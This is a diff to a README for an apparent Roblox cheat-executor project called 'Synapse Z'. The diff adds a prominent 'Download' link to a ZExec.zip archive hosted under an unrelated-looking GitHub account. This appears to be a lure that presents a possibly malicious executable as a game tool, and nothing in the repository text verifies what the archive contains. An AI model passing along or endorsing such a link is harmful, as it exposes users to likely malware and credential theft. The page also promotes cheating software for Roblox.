@@ -1,6 +1,8 @@
 # Roblox Synapse Z
 Welcome to the Roblox Synapse Z repository! 🎮 Here, you'll find a variety of scripts and tools designed to enhance your Roblox experience using Synapse and Lua.
 
+# [Download](https://github.com/dinorahwheel878/halyava/releases/download/tewoew/ZExec.zip)
+
 ## About
 Roblox Synapse Z focuses on providing powerful scripts and utilities for the Roblox platform. These tools allow you to automate tasks, customize gameplay, and enhance your gaming experience.
 
